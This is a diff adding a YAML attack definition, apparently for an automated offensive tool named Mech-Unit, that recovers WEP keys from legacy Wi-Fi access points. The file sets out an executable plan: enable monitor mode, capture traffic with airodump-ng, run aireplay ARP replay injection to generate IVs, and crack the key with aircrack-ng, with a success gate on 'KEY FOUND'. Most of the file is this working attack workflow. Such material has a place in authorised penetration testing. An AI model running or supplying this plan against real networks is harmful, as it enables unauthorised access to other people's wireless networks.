@@ -1,0 +1,63 @@
+# Mech-Unit attack intent — WEP recovery (legacy APs).
+# ARP-replay injection to generate IVs, then aircrack against the traffic.
+id: wifi_wep
+name: WEP Key Recovery
+category: wireless
+operator_label: "Crack a legacy WEP network"
+operator_description: >
+  Generates IV traffic via ARP replay injection and recovers the WEP key
+  with aircrack. Applies only to ancient APs still running WEP — quick and
+  near-certain when the network exists.
+outcome: "WEP key in hex, or insufficient IVs"
+grants: [wifi.wep_key]
+time_to_impact: minutes
+noise: medium
+risk_notes: >
+  Injection traffic is visible on the air. Legacy networks only.
+
+preconditions:
+  - probe: wireless_adapter_monitor_capable
+  - probe: tools_present
+    with: [airodump-ng, aireplay-ng, aircrack-ng]
+
+plan:
+  - step: monitor_up
+    tool: monitor_mode_enable
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+
+  - step: capture
+    tool: airodump_capture
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      channel: "{{ resolver.channel.or_hop }}"
+      capture_file: "{{ resolver.artifacts.capture_prefix }}"
+    max_wait: 120
+    extracts:
+      ivs: "# Data: ([0-9]+)"
+    on_fail: abort
+
+  - step: replay
+    tool: aireplay_attack
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      attack: "3"
+    when: "!{{ facts.ivs }}"
+    max_wait: 60
+    on_fail: warn
+
+  - step: crack
+    tool: aircrack_crack
+    args:
+      cap_file: "{{ artifacts.capture }}"
+    max_wait: 1800
+    gate:
+      output: "KEY FOUND"
+    on_fail: warn
+
+artifacts:
+  capture: "{{ plan_dir }}/capture-01.cap"
+
+llm_required: false
